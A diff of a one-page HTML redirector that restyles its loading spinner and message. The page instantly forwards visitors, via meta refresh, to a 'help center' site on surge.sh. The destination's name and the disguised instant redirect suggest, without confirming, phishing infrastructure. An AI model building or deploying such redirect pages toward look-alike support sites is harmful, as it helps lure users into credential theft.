@@ -2,35 +2,34 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Redirecting...</title>
   <meta http-equiv="refresh" content="0; url=https://action-help-center-24-hours.surge.sh/">
   <style>
     body {
-      height: 100vh;
+      background-color: #0f172a;
+      color: white;
       display: flex;
-      justify-content: center;
       align-items: center;
-      background: linear-gradient(135deg, #cecfd1, #bfc1c2);
-      color: #fff;
-      font-family: "Segoe UI", sans-serif;
+      justify-content: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      flex-direction: column;
     }
-    .spinner {
-      border: 6px solid rgba(255, 255, 255, 0.884);
-      border-top: 6px solid white;
+    .loader {
+      border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top: 6px solid #fff;
       border-radius: 50%;
       width: 60px;
       height: 60px;
       animation: spin 1s linear infinite;
-      margin-bottom: 15px;
+      margin-bottom: 20px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <div>
-    <div class="spinner"></div>
-    <h1>Please wait — redirecting...</h1>
-  </div>
+  <div class="loader"></div>
+  <h2>Loading... Please wait</h2>
 </body>
 </html>
